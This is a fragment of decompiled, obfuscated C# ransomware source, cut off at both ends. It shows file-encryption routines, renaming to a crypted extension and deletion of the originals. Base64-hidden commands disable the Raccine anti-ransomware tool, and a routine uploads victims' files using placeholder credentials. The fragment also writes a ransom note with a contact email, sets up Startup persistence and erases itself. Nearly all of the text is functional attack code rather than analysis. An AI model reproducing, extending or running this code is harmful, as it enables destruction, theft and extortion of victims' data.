			nDKKRmovEZDKb(bRWwIGxQDNUf("dGFza2tpbGw="), bRWwIGxQDNUf("L0YgL0lNIFJhY2NpbmVTZXR0aW5ncy5leGU="));
			nDKKRmovEZDKb(bRWwIGxQDNUf("cmVn"), bRWwIGxQDNUf("ZGVsZXRlICJIS0NVXFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFJ1biIgL1YgIlJhY2NpbmUgVHJheSIgL0Y="));
			nDKKRmovEZDKb(bRWwIGxQDNUf("cmVn"), bRWwIGxQDNUf("ZGVsZXRlIEhLQ1VcU29mdHdhcmVcUmFjY2luZSAvRg=="));
			nDKKRmovEZDKb(bRWwIGxQDNUf("c2NodGFza3M="), bRWwIGxQDNUf("L0RFTEVURSAvVE4gIlJhY2NpbmUgUnVsZXMgVXBkYXRlciIgL0Y="));
		}
		catch
		{
		}
	}

	public static void uplyNzshJdeZA(string AfwNdxoINpEQ, byte[] pMEBiqkJwYW)
	{
		try
		{
			byte[] bytes = Encoding.ASCII.GetBytes(bRWwIGxQDNUf("R290QWxsRG9uZQ=="));
			using FileStream fileStream = new FileStream(AfwNdxoINpEQ, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
			fileStream.Write(pMEBiqkJwYW, 0, pMEBiqkJwYW.Length);
			fileStream.Write(bytes, 0, bytes.Length);
		}
		catch (Exception)
		{
		}
	}

	public static void cXQuwfSPMZ()
	{
		nDKKRmovEZDKb("cmd.exe", bRWwIGxQDNUf("L0MgcGluZyAxMjcuMC4wLjcgLW4gMyA+IE51bCAmIGZzdXRpbCBmaWxlIHNldFplcm9EYXRhIG9mZnNldD0wIGxlbmd0aD01MjQyODgg4oCcJXPigJ0gJiBEZWwgL2YgL3Eg4oCcJXPigJ0="));
		string text = bRWwIGxQDNUf("L0MgY2hvaWNlIC9DIFkgL04gL0QgWSAvVCAzICYgRGVsIA==");
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.Arguments = "\"" + text + "\"" + Assembly.GetEntryAssembly()!.Location;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		processStartInfo.CreateNoWindow = true;
		processStartInfo.FileName = "cmd.exe";
		Process.Start(processStartInfo);
		Environment.Exit(0);
	}

	public static void UUzWCnDnxX(string NttlUOtDlPO)
	{
		try
		{
			FileAttributes attributes = File.GetAttributes(NttlUOtDlPO);
			if ((attributes & FileAttributes.ReadOnly) == FileAttributes.ReadOnly)
			{
				File.SetAttributes(NttlUOtDlPO, attributes & ~FileAttributes.ReadOnly);
			}
		}
		catch (Exception ex)
		{
			if (nmuAfqaGuDVCWu)
			{
				try
				{
					File.AppendAllText(vsTGVFSJmItByidD, "File: " + NttlUOtDlPO + " - Error while removing readonly attribute: " + ex.Message + "\r\n");
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
		}
	}

	public static string GMaTMFIxjiIeHx()
	{
		OperatingSystem oSVersion = Environment.OSVersion;
		Version version = oSVersion.Version;
		string text = "";
		if (oSVersion.Platform == PlatformID.Win32Windows)
		{
			switch (version.Minor)
			{
			case 90:
				text = "Me";
				break;
			case 10:
				text = ((!(version.Revision.ToString() == "2222A")) ? "98" : "98SE");
				break;
			case 0:
				text = "95";
				break;
			}
		}
		else if (oSVersion.Platform == PlatformID.Win32NT)
		{
			switch (version.Major)
			{
			case 3:
				text = "NT 3.51";
				break;
			case 4:
				text = "NT 4.0";
				break;
			case 5:
				text = ((version.Minor != 0) ? "XP" : "2000");
				break;
			case 6:
				text = ((version.Minor != 0) ? ((version.Minor != 1) ? ((version.Minor != 2) ? "8.1" : "8") : "7") : "Vista");
				break;
			case 10:
				text = "10";
				break;
			}
		}
		if (text != "")
		{
			text = "Windows " + text;
			if (oSVersion.ServicePack != "")
			{
				text = text + " " + oSVersion.ServicePack;
			}
		}
		return text;
	}

	public static string sTVHCjNeuSKvKBk(string IAYJdawfijIrLr)
	{
		string text = Path.GetTempPath() + "\\RESTORE_FILES_INFO.txt";
		try
		{
			if (!File.Exists(text))
			{
				using StreamWriter streamWriter = new StreamWriter(text);
				streamWriter.WriteLine(bRWwIGxQDNUf("WW91ciBmaWxlcyBhcmUgc2VjdXJlZC4uLg0KbWlsbGVuaTUwMDBAcXEuY29t"));
				streamWriter.WriteLine("\r\n");
				streamWriter.WriteLine(bRWwIGxQDNUf("S2V5IElkZW50aWZpZXI6IA=="));
				streamWriter.WriteLine(IAYJdawfijIrLr);
			}
			else
			{
				File.AppendAllText(text, "\r\nAditional KeyId:\r\n" + IAYJdawfijIrLr);
			}
			return text;
		}
		catch (Exception ex)
		{
			if (nmuAfqaGuDVCWu)
			{
				try
				{
					File.AppendAllText(vsTGVFSJmItByidD, "Error while writing Temp Folder Report: " + ex.Message + "\r\n");
					return text;
				}
				catch (Exception)
				{
					return text;
				}
			}
			return text;
		}
	}

	public static void lFAnCpzlNAdP(string HmCtAmrixEzpLE, string GcbPrHQYptFR)
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
		using StreamWriter streamWriter = new StreamWriter(folderPath + "\\" + HmCtAmrixEzpLE + ".url");
		streamWriter.WriteLine("[Summary]");
		streamWriter.WriteLine("URL=file:///" + GcbPrHQYptFR);
		streamWriter.WriteLine("IconIndex=0");
		string text = GcbPrHQYptFR.Replace('\\', '/');
		streamWriter.WriteLine("IconFile=" + text);
	}

	private static void QHzylkAvKdeTKM(string[] PMZlpMzFHhyQzIaP, string[] XqHORIrSjsHDOt, string[] PqenVIRhtuyXjpTXz, string xfpteroWYlHWs, string iydOsgOQCY)
	{
		OyNQAnsoUFivGOP = Encoding.ASCII.GetBytes(xfpteroWYlHWs);
		DriveInfo[] array = null;
		if (PMZlpMzFHhyQzIaP[0] == "[auto]")
		{
			try
			{
				array = DriveInfo.GetDrives();
			}
			catch (Exception)
			{
			}
			if (array.Length > 0)
			{
				for (int i = 0; i < array.Length; i++)
				{
					if (array[i].IsReady && array[i].DriveType != DriveType.CDRom && !jDiasrreCxZfH.Contains(array[i].Name))
					{
						jDiasrreCxZfH.Add(array[i].Name);
					}
				}
			}
		}
		else
		{
			for (int j = 0; j < PMZlpMzFHhyQzIaP.Length; j++)
			{
				if (!jDiasrreCxZfH.Contains(PMZlpMzFHhyQzIaP[j]))
				{
					jDiasrreCxZfH.Add(PMZlpMzFHhyQzIaP[j]);
				}
			}
		}
		if (jDiasrreCxZfH.Contains(bRWwIGxQDNUf("Qzpc")) && SwwELWOkpNS == "YES")
		{
			jDiasrreCxZfH.Remove(bRWwIGxQDNUf("Qzpc"));
		}
		Parallel.ForEach(jDiasrreCxZfH, delegate(string t)
		{
			if (ORfPBuBSaW && !GMaTMFIxjiIeHx().Contains("XP"))
			{
				Thread thread = new Thread((ThreadStart)delegate
				{
					if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
					{
						nxevbysxclBn(WindowsIdentity.GetCurrent().Name, t);
					}
				});
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
			if (hmqxhsSApKDzHR == "YES")
			{
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					rgqtuHSyPjEGMh(t, XqHORIrSjsHDOt, iydOsgOQCY, PqenVIRhtuyXjpTXz, xfpteroWYlHWs);
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = false;
				thread2.Start();
				thread2.Join();
			}
			else
			{
				rgqtuHSyPjEGMh(t, XqHORIrSjsHDOt, iydOsgOQCY, PqenVIRhtuyXjpTXz, xfpteroWYlHWs);
			}
		});
	}

	public static void rgqtuHSyPjEGMh(string YYeptELatrCc, string[] VhHeEpELtYCaZD, string RMJkCCGYgfnIQdD, string[] RVuLRehgzEzwDosH, string xPkJHAIivBbtW)
	{
		List<string> list = new List<string>();
		List<string> list2 = new List<string>();
		list2.Add("");
		List<string> list3 = list2;
		if (DsytHgVXDv == "NO")
		{
			list = ocDDAYDYhgb(YYeptELatrCc, VhHeEpELtYCaZD, RMJkCCGYgfnIQdD, RVuLRehgzEzwDosH, xPkJHAIivBbtW);
			return;
		}
		list = JvwCpGzjDLhz.SearchFiles(YYeptELatrCc);
		foreach (string text in VhHeEpELtYCaZD)
		{
			foreach (string item in list)
			{
				if (RVuLRehgzEzwDosH.Length != 0)
				{
					int num = 0;
					while (num < RVuLRehgzEzwDosH.Length)
					{
						string value = RVuLRehgzEzwDosH[num];
						if (!item.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_02f2;
					}
				}
				if ((kYgKGUqZJktLA == "NO" && !item.EndsWith(text)) || oqWWUuhrnyOw.Contains(item))
				{
					continue;
				}
				if (BSZjxjpTZw == "YES")
				{
					try
					{
						if (IlfCoNWMBTzl.BxdCSMELkuma(item))
						{
							IlfCoNWMBTzl.SxXuDtbxCNga(item);
						}
					}
					catch
					{
					}
				}
				oqWWUuhrnyOw.Add(item);
				if (!ASgzEyFxzgQhoK.Contains(Path.GetDirectoryName(item)))
				{
					ASgzEyFxzgQhoK.Add(Path.GetDirectoryName(item));
				}
				try
				{
					FileStream fileStream = new FileStream(item, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
					if (OsMYpRNHCzj == "YES" && fileStream.Length > Convert.ToInt32(AuoMqBzahHDilI) * 1024 * 1024 && !list3.Contains(text))
					{
						if (PccLrMHcmQe == "YES")
						{
							foreach (string item2 in DUqqCtAuioSycsG)
							{
								if (item.ToLower().EndsWith(item2) && WGgfEjujSrGUZq == "YES")
								{
									if (Convert.ToInt32(LSzalKwxGC) * 1024 * 1024 > fileStream.Length)
									{
										try
										{
											fRNtfJxgwGHJ.kmufixlgVkgi("URL", "USERNAME", "ACCESO", item);
										}
										catch
										{
										}
									}
								}
								else if (item.ToLower().EndsWith(item2) && WGgfEjujSrGUZq == "NO")
								{
									try
									{
										fRNtfJxgwGHJ.kmufixlgVkgi("URL", "USERNAME", "ACCESO", item);
									}
									catch
									{
									}
								}
							}
						}
						fileStream.Dispose();
						byte[] wJqUVVdodPiH = goQLZKylfBJoMX.NqSyJmWMHCvpIn(item, Convert.ToInt32(AuoMqBzahHDilI) * 1024 * 1024);
						byte[] badfsIMDWVvNqE = goQLZKylfBJoMX.CqEeuYLOGtltNm(wJqUVVdodPiH, Encoding.ASCII.GetBytes(xPkJHAIivBbtW), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 });
						goQLZKylfBJoMX.TRVBZzkmRKRt(item, badfsIMDWVvNqE);
						if (RMJkCCGYgfnIQdD != ".*")
						{
							File.Move(item, item + RMJkCCGYgfnIQdD);
						}
					}
					else if (RMJkCCGYgfnIQdD != ".*")
					{
						btscIgmPJdogqC(item, item + RMJkCCGYgfnIQdD, OyNQAnsoUFivGOP);
					}
					else
					{
						btscIgmPJdogqC(item, item + ".part", OyNQAnsoUFivGOP);
					}
				}
				catch (Exception)
				{
				}
				IL_02f2:;
			}
		}
	}

	public static void wQSklhyaGNc(List<string> HKxdhulqWvO, string[] KfjRBnPBqOCBjl, string MComNnMGEylOiKcW, string[] jFrZJpfJBbXRCd, string SxUajHtzHq)
	{
		List<string> eRJjXroUaRKCqq = new List<string> { "" };
		if (kYgKGUqZJktLA == "NO")
		{
			string bNBUkzjCfRSyzj;
			Parallel.ForEach(KfjRBnPBqOCBjl, delegate(string t1)
			{
				foreach (string item in HKxdhulqWvO)
				{
					if (jFrZJpfJBbXRCd.Length != 0)
					{
						string[] array4 = jFrZJpfJBbXRCd;
						int num2 = 0;
						while (num2 < array4.Length)
						{
							string value2 = array4[num2];
							if (!item.EndsWith(value2))
							{
								num2++;
								continue;
							}
							goto IL_05e6;
						}
					}
					try
					{
						if (item.EndsWith(MComNnMGEylOiKcW))
						{
							goto IL_05e6;
						}
					}
					catch (Exception)
					{
						goto IL_05e6;
					}
					if (item.EndsWith(t1) && !oqWWUuhrnyOw.Contains(item))
					{
						if (BSZjxjpTZw == "YES")
						{
							try
							{
								if (IlfCoNWMBTzl.BxdCSMELkuma(item))
								{
									IlfCoNWMBTzl.SxXuDtbxCNga(item);
								}
							}
							catch
							{
							}
						}
						oqWWUuhrnyOw.Add(item);
						if (!ASgzEyFxzgQhoK.Contains(Path.GetDirectoryName(item)))
						{
							ASgzEyFxzgQhoK.Add(Path.GetDirectoryName(item));
						}
						UUzWCnDnxX(item);
						try
						{
							try
							{
								if (new FileInfo(item).Length != 0L)
								{
									goto end_IL_00e5;
								}
								goto end_IL_00e5_2;
								end_IL_00e5:;
							}
							catch (Exception ex12)
							{
								if (nmuAfqaGuDVCWu)
								{
									try
									{
										File.AppendAllText(vsTGVFSJmItByidD, "File: " + item + " - Error while reading if filesize is zero: " + ex12.Message + "\r\n");
									}
									catch (Exception)
									{
									}
								}
								goto end_IL_00e5_2;
							}
							if (OsMYpRNHCzj == "YES" && new FileInfo(item).Length > Convert.ToInt32(AuoMqBzahHDilI) * 1024 * 1024 && !eRJjXroUaRKCqq.Contains(t1))
							{
								try
								{
									if (MComNnMGEylOiKcW != ".*")
									{
										File.Move(item, item + MComNnMGEylOiKcW);
									}
								}
								catch (Exception ex14)
								{
									if (!nmuAfqaGuDVCWu)
									{
										break;
									}
									try
									{
										File.AppendAllText(vsTGVFSJmItByidD, "File: " + item + " - Error while renaming to crypted extension: " + ex14.Message + "\r\n");
										break;
									}
									catch (Exception)
									{
										break;
									}
								}
								bNBUkzjCfRSyzj = "";
								if (MComNnMGEylOiKcW != ".*")
								{
									bNBUkzjCfRSyzj = item + MComNnMGEylOiKcW;
								}
								else
								{
									bNBUkzjCfRSyzj = item;
								}
								if (PccLrMHcmQe == "YES")
								{
									Thread thread2 = new Thread((ThreadStart)delegate
									{
										foreach (string item2 in DUqqCtAuioSycsG)
										{
											if (bNBUkzjCfRSyzj.ToLower().EndsWith(item2 + MComNnMGEylOiKcW) && WGgfEjujSrGUZq == "YES")
											{
												if (Convert.ToInt32(LSzalKwxGC) * 1024 * 1024 > new FileInfo(bNBUkzjCfRSyzj).Length)
												{
													try
													{
														fRNtfJxgwGHJ.kmufixlgVkgi("URL", "USERNAME", "ACCESO", bNBUkzjCfRSyzj);
													}
													catch
													{
													}
												}
											}
											else if (bNBUkzjCfRSyzj.ToLower().EndsWith(item2) && WGgfEjujSrGUZq == "NO")
											{
												try
												{
													fRNtfJxgwGHJ.kmufixlgVkgi("URL", "USERNAME", "ACCESO", bNBUkzjCfRSyzj);
												}
												catch
												{
												}
											}
										}
									});
									thread2.Priority = ThreadPriority.Normal;
									thread2.IsBackground = false;
									thread2.Start();
								}
								string text3 = yDDlWtytZCKW.oCnKAQvfHXAbfGc(32);
								string s3 = gUDFOoTZrDKjIfA.kqOSSOKTyvumBVs(text3);
								byte[] bytes3 = Encoding.ASCII.GetBytes(s3);
								byte[] array5 = null;
								byte[] array6 = goQLZKylfBJoMX.NqSyJmWMHCvpIn(bNBUkzjCfRSyzj, Convert.ToInt32(AuoMqBzahHDilI) * 1024 * 1024);
								goQLZKylfBJoMX.TRVBZzkmRKRt(BadfsIMDWVvNqE: (!ifjARTnvYFXaP) ? (USpxehIBNWBw ? goQLZKylfBJoMX.CqEeuYLOGtltNm(array6, Encoding.ASCII.GetBytes(text3), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : goQLZKylfBJoMX.CqEeuYLOGtltNm(array6, Encoding.ASCII.GetBytes(SxUajHtzHq), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (USpxehIBNWBw ? fqNSSLRDaIS.xnkFYMOGZg(array6, Encoding.ASCII.GetBytes(text3), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : fqNSSLRDaIS.xnkFYMOGZg(array6, Encoding.ASCII.GetBytes(SxUajHtzHq), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })), fprCvFubCIRP: bNBUkzjCfRSyzj, DgqotAuYtuq: bytes3);
							}
							else
							{
								string text4 = yDDlWtytZCKW.oCnKAQvfHXAbfGc(32);
								string s4 = gUDFOoTZrDKjIfA.kqOSSOKTyvumBVs(text4);
								byte[] bytes4 = Encoding.ASCII.GetBytes(s4);
								if (MComNnMGEylOiKcW != ".*")
								{
									if (!aWqOuNoAvwwKwt)
									{
										if (!USpxehIBNWBw)
										{
											wZwIXYigPPI(item, item + MComNnMGEylOiKcW, OyNQAnsoUFivGOP);
										}
										else
										{
											wZwIXYigPPI(item, item + MComNnMGEylOiKcW, Encoding.ASCII.GetBytes(text4));
										}
									}
									else
									{
										try
										{
											if (!USpxehIBNWBw)
											{
												TLjaPcTldYTTzR(item, item + MComNnMGEylOiKcW, OyNQAnsoUFivGOP);
											}
											else
											{
												TLjaPcTldYTTzR(item, item + MComNnMGEylOiKcW, Encoding.ASCII.GetBytes(text4));
											}
										}
										catch (Exception ex16)
										{
											if (nmuAfqaGuDVCWu)
											{
												try
												{
													File.AppendAllText(vsTGVFSJmItByidD, "File: " + item + " - Error while fully writing to file: " + ex16.Message + "\r\n");
												}
												catch (Exception)
												{
												}
											}
										}
									}
								}
								else if (!aWqOuNoAvwwKwt)
								{
									if (!USpxehIBNWBw)
									{
										wZwIXYigPPI(item, item + ".part", OyNQAnsoUFivGOP);
									}
									else
									{
										wZwIXYigPPI(item, item + ".part", Encoding.ASCII.GetBytes(text4));
									}
								}
								else
								{
									try
									{
										if (!USpxehIBNWBw)
										{
											TLjaPcTldYTTzR(item, item, OyNQAnsoUFivGOP);
										}
										else
										{
											TLjaPcTldYTTzR(item, item, Encoding.ASCII.GetBytes(text4));
										}
									}
									catch (Exception ex18)
									{
										if (nmuAfqaGuDVCWu)
										{
											try
											{
												File.AppendAllText(vsTGVFSJmItByidD, "File: " + item + " - Error while fully writing to file: " + ex18.Message + "\r\n");
											}
											catch (Exception)
											{
											}
										}
									}
								}
								if (USpxehIBNWBw)
								{
									if (MComNnMGEylOiKcW != ".*")
									{
										uplyNzshJdeZA(item + MComNnMGEylOiKcW, bytes4);
									}
									else
									{
										uplyNzshJdeZA(item, bytes4);
									}
								}
							}
							goto IL_05e6;
							end_IL_00e5_2:;
						}
						catch (Exception)
						{
							goto IL_05e6;
						}
					}
					continue;
					IL_05e6:
					HKxdhulqWvO.Remove(item);
				}
			});
			return;
		}
		Parallel.ForEach(HKxdhulqWvO, delegate(string fileInfo)
		{
			if (jFrZJpfJBbXRCd.Length != 0)
			{
				string[] array = jFrZJpfJBbXRCd;
				int num = 0;
				while (num < array.Length)
				{
					string value = array[num];
					if (!fileInfo.EndsWith(value))
					{
						num++;
						continue;
					}
					goto IL_0676;
				}
			}
			try
			{
				if (fileInfo.EndsWith(MComNnMGEylOiKcW))
				{
					goto IL_0676;
				}
			}
			catch (Exception)
			{
				goto IL_0676;
			}
			if (!oqWWUuhrnyOw.Contains(fileInfo))
			{
				if (BSZjxjpTZw == "YES")
				{
					try
					{
						if (IlfCoNWMBTzl.BxdCSMELkuma(fileInfo))
						{
							IlfCoNWMBTzl.SxXuDtbxCNga(fileInfo);
						}
					}
					catch
					{
					}
				}
				oqWWUuhrnyOw.Add(fileInfo);
				if (!ASgzEyFxzgQhoK.Contains(Path.GetDirectoryName(fileInfo)))
				{
					ASgzEyFxzgQhoK.Add(Path.GetDirectoryName(fileInfo));
				}
				UUzWCnDnxX(fileInfo);
				try
				{
					try
					{
						if (new FileInfo(fileInfo).Length != 0L)
						{
							goto end_IL_010d;
						}
						goto end_IL_010d_2;
						end_IL_010d:;
					}
					catch (Exception ex2)
					{
						if (nmuAfqaGuDVCWu)
						{
							try
							{
								File.AppendAllText(vsTGVFSJmItByidD, "File: " + fileInfo + " - Error while reading if filesize is zero: " + ex2.Message + "\r\n");
							}
							catch (Exception)
							{
							}
						}
						goto end_IL_010d_2;
					}
					if (OsMYpRNHCzj == "YES" && new FileInfo(fileInfo).Length > Convert.ToInt32(AuoMqBzahHDilI) * 1024 * 1024)
					{
						try
						{
							if (MComNnMGEylOiKcW != ".*")
							{
								File.Move(fileInfo, fileInfo + MComNnMGEylOiKcW);
							}
						}
						catch (Exception ex4)
						{
							if (nmuAfqaGuDVCWu)
							{
								try
								{
									File.AppendAllText(vsTGVFSJmItByidD, "File: " + fileInfo + " - Error while renaming to crypted extension: " + ex4.Message + "\r\n");
									return;
								}
								catch (Exception)
								{
									return;
								}
							}
							return;
						}
						if (MComNnMGEylOiKcW != ".*")
						{
							fileInfo += MComNnMGEylOiKcW;
						}
						if (PccLrMHcmQe == "YES")
						{
							Thread thread = new Thread((ThreadStart)delegate
							{
								foreach (string item3 in DUqqCtAuioSycsG)
								{
									if (fileInfo.ToLower().EndsWith(item3 + MComNnMGEylOiKcW) && WGgfEjujSrGUZq == "YES")
									{
										if (Convert.ToInt32(LSzalKwxGC) * 1024 * 1024 > new FileInfo(fileInfo).Length)
										{
											try
											{
												fRNtfJxgwGHJ.kmufixlgVkgi("URL", "USERNAME", "ACCESO", fileInfo);
											}
											catch
											{
											}
										}
									}
									else if (fileInfo.ToLower().EndsWith(item3) && WGgfEjujSrGUZq == "NO")
									{
										try
										{
											fRNtfJxgwGHJ.kmufixlgVkgi("URL", "USERNAME", "ACCESO", fileInfo);
										}
										catch
										{
										}
									}
								}
							});
							thread.IsBackground = false;
							thread.Priority = ThreadPriority.Normal;
							thread.Start();
						}
						string text = yDDlWtytZCKW.oCnKAQvfHXAbfGc(32);
						string s = gUDFOoTZrDKjIfA.kqOSSOKTyvumBVs(text);
						byte[] bytes = Encoding.ASCII.GetBytes(s);
						byte[] array2 = null;
						byte[] array3 = goQLZKylfBJoMX.NqSyJmWMHCvpIn(fileInfo, Convert.ToInt32(AuoMqBzahHDilI) * 1024 * 1024);
						goQLZKylfBJoMX.TRVBZzkmRKRt(BadfsIMDWVvNqE: (!ifjARTnvYFXaP) ? (USpxehIBNWBw ? goQLZKylfBJoMX.CqEeuYLOGtltNm(array3, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : goQLZKylfBJoMX.CqEeuYLOGtltNm(array3, Encoding.ASCII.GetBytes(SxUajHtzHq), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (USpxehIBNWBw ? fqNSSLRDaIS.xnkFYMOGZg(array3, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : fqNSSLRDaIS.xnkFYMOGZg(array3, Encoding.ASCII.GetBytes(SxUajHtzHq), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })), fprCvFubCIRP: fileInfo, DgqotAuYtuq: bytes);
					}
					else
					{
						string text2 = yDDlWtytZCKW.oCnKAQvfHXAbfGc(32);
						string s2 = gUDFOoTZrDKjIfA.kqOSSOKTyvumBVs(text2);
						byte[] bytes2 = Encoding.ASCII.GetBytes(s2);
						if (MComNnMGEylOiKcW != ".*")
						{
							if (!aWqOuNoAvwwKwt)
							{
								if (!USpxehIBNWBw)
								{
									wZwIXYigPPI(fileInfo, fileInfo + MComNnMGEylOiKcW, OyNQAnsoUFivGOP);
								}
								else
								{
									wZwIXYigPPI(fileInfo, fileInfo + MComNnMGEylOiKcW, Encoding.ASCII.GetBytes(text2));
								}
							}
							else
							{
								try
								{
									if (!USpxehIBNWBw)
									{
										TLjaPcTldYTTzR(fileInfo, fileInfo + MComNnMGEylOiKcW, OyNQAnsoUFivGOP);
									}
									else
									{
										TLjaPcTldYTTzR(fileInfo, fileInfo + MComNnMGEylOiKcW, Encoding.ASCII.GetBytes(text2));
									}
								}
								catch (Exception ex6)
								{
									if (nmuAfqaGuDVCWu)
									{
										try
										{
											File.AppendAllText(vsTGVFSJmItByidD, "File: " + fileInfo + " - Error while fully writing to file: " + ex6.Message + "\r\n");
										}
										catch (Exception)
										{
										}
									}
								}
							}
						}
						else if (!aWqOuNoAvwwKwt)
						{
							if (!USpxehIBNWBw)
							{
								wZwIXYigPPI(fileInfo, fileInfo + ".part", OyNQAnsoUFivGOP);
							}
							else
							{
								wZwIXYigPPI(fileInfo, fileInfo + ".part", Encoding.ASCII.GetBytes(text2));
							}
						}
						else
						{
							try
							{
								if (!USpxehIBNWBw)
								{
									TLjaPcTldYTTzR(fileInfo, fileInfo, OyNQAnsoUFivGOP);
								}
								else
								{
									TLjaPcTldYTTzR(fileInfo, fileInfo, Encoding.ASCII.GetBytes(text2));
								}
							}
							catch (Exception ex8)
							{
								if (nmuAfqaGuDVCWu)
								{
									try
									{
										File.AppendAllText(vsTGVFSJmItByidD, "File: " + fileInfo + " - Error while fully writing to file: " + ex8.Message + "\r\n");
									}
									catch (Exception)
									{
									}
								}
							}
						}
						if (USpxehIBNWBw)
						{
							if (MComNnMGEylOiKcW != ".*")
							{
								uplyNzshJdeZA(fileInfo + MComNnMGEylOiKcW, bytes2);
							}
							else
							{
								uplyNzshJdeZA(fileInfo, bytes2);
							}
						}
					}
					end_IL_010d_2:;
				}
				catch (Exception)
				{
				}
			}
			goto IL_0676;
			IL_0676:
			HKxdhulqWvO.Remove(fileInfo);
		});
	}

	private static void btscIgmPJdogqC(string ydIQWHKVQbAgc, string RKNtBTKnaJNyaQ, byte[] kSvZqTuQDmP)
	{
		try
		{
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			FileStream fileStream = new FileStream(RKNtBTKnaJNyaQ, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite);
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(kSvZqTuQDmP, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Padding = PaddingMode.Zeros;
			rijndaelManaged.Mode = CipherMode.CBC;
			CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
			FileStream fileStream2 = new FileStream(ydIQWHKVQbAgc, FileMode.Open);
			int num;
			while ((num = fileStream2.ReadByte()) != -1)
			{
				cryptoStream.WriteByte((byte)num);
			}
			fileStream2.Dispose();
			cryptoStream.Dispose();
			fileStream.Dispose();
			try
			{
				if (RKNtBTKnaJNyaQ.Length > 0)
				{
					FileStream fileStream3 = new FileStream(ydIQWHKVQbAgc, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
					if (PccLrMHcmQe == "YES")
					{
						foreach (string item in DUqqCtAuioSycsG)
						{
							if (ydIQWHKVQbAgc.ToLower().EndsWith(item) && WGgfEjujSrGUZq == "YES")
							{
								if (Convert.ToInt32(LSzalKwxGC) * 1024 * 1024 > fileStream3.Length)
								{
									try
									{
										fRNtfJxgwGHJ.kmufixlgVkgi("URL", "USERNAME", "ACCESO", ydIQWHKVQbAgc);
									}
									catch
									{
									}
								}
							}
							else if (ydIQWHKVQbAgc.ToLower().EndsWith(item) && WGgfEjujSrGUZq == "NO")
							{
								try
								{
									fRNtfJxgwGHJ.kmufixlgVkgi("URL", "USERNAME", "ACCESO", ydIQWHKVQbAgc);
								}
								catch
								{
								}
							}
						}
					}
					fileStream3.Dispose();
					int num2 = 1000000;
					while (true)
					{
						try
						{
							while (File.Exists(ydIQWHKVQbAgc) && num2 >= 0)
							{
								File.Delete(ydIQWHKVQbAgc);
							}
						}
						catch
						{
							num2--;
							continue;
						}
						break;
					}
					if (RKNtBTKnaJNyaQ.EndsWith(".part"))
					{
						File.Move(RKNtBTKnaJNyaQ, RKNtBTKnaJNyaQ.Replace(".part", ""));
					}
					return;
				}
				try
				{
					File.Delete(RKNtBTKnaJNyaQ);
				}
				catch
				{
				}
			}
			catch
			{
			}
		}
		catch (Exception)
		{
		}
	}

	public static void TLjaPcTldYTTzR(string wbyOAkjrkrdI, string FdLGAWzSHexju, byte[] QTWlGTKrdFbPAJ)
	{
		if (PccLrMHcmQe == "YES")
		{
			FileStream fileStream = new FileStream(wbyOAkjrkrdI, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
			foreach (string item in DUqqCtAuioSycsG)
			{
				if (wbyOAkjrkrdI.ToLower().EndsWith(item) && WGgfEjujSrGUZq == "YES")
				{
					if (Convert.ToInt32(LSzalKwxGC) * 1024 * 1024 > fileStream.Length)
					{
						try
						{
							fRNtfJxgwGHJ.kmufixlgVkgi("URL", "USERNAME", "ACCESO", wbyOAkjrkrdI);
						}
						catch
						{
						}
					}
				}
				else if (wbyOAkjrkrdI.ToLower().EndsWith(item) && WGgfEjujSrGUZq == "NO")
				{
					try
					{
						fRNtfJxgwGHJ.kmufixlgVkgi("URL", "USERNAME", "ACCESO", wbyOAkjrkrdI);
					}
					catch
					{
					}
				}
			}
			fileStream.Dispose();
		}
		byte[] bytes = fqNSSLRDaIS.xnkFYMOGZg(File.ReadAllBytes(wbyOAkjrkrdI), QTWlGTKrdFbPAJ, new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 });
		File.WriteAllBytes(wbyOAkjrkrdI, bytes);
		if (wbyOAkjrkrdI != FdLGAWzSHexju)
		{
			File.Move(wbyOAkjrkrdI, FdLGAWzSHexju);
		}
	}

	private static void wZwIXYigPPI(string ldxrEKPwhQW, string hcwuLFFuBr, byte[] hTIzuvuSCESJp)
	{
		try
		{
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			string path = hcwuLFFuBr;
			FileStream fileStream = new FileStream(path, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite);
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
